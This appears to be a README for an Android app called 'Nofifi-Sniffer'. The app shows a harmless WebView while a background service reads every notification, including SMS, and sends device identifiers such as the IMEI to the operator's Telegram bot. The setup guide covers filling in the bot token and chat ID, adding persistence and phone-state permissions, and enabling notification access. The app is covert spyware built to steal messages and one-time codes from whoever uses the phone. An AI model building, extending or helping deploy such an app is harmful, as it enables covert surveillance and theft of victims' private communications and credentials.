🚀 Nofifi-Sniffer
A powerful Android app that loads a WebView, monitors notifications, and sends device details to a Telegram bot.

🔹 Features
✅ WebView Loader → Displays the Android Developer website inside a WebView.

✅ Notification Listener → Reads all notifications, including SMS and hidden notifications.

✅ Background Service → Runs persistently to monitor notifications.

✅ Device Information Retrieval → Sends details (Manufacturer, Model, Android Version, Android ID, IMEI) to Telegram.

🛠️ Setup Guide
1️⃣ Step 1: Configure Telegram Bot
🔹 Create a bot on @BotFather and get the BOT_TOKEN.

🔹 Find your user ID using @userinfobot and get your CHAT_ID.

2️⃣ Step 2: Edit MainActivity.java
🔹 Open MainActivity.java and update the following variables with your credentials:

java
Copy
Edit
private static final String BOT_TOKEN = ""; // Replace with your Telegram bot token
private static final String CHAT_ID = "";   // Replace with your Telegram user ID
3️⃣ Step 3: Edit MyNotificationListener.java
🔹 Open MyNotificationListener.java and update the following variables with your credentials:

java
Copy
Edit
private static final String BOT_TOKEN = ""; // Replace with your Telegram bot token
private static final String CHAT_ID = "";   // Replace with your Telegram user ID
4️⃣ Step 4: Grant Required Permissions
🔹 Modify the AndroidManifest.xml file and ensure the following permissions are added:

xml
Copy
Edit
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"/>
5️⃣ Step 5: Enable Notification Access
🔹 After installing the app, go to:

📌 Settings → Apps & Notifications → Special App Access → Notification Access → Enable access for Nofifi-Sniffer.

6️⃣ Step 6: Run the App
🔹 Launch the app → It will load the WebView and request permissions.

🔹 The background service will start and send device details to your Telegram bot.

⚠️ Security Risks & Considerations
🔐 Hardcoded Bot Token → Never expose your Telegram bot token publicly.

🔐 IMEI Access (Android 9 and below) → IMEI is sensitive; handle it securely.

🔐 Notification Access → The app can read all notifications, including SMS and hidden messages.

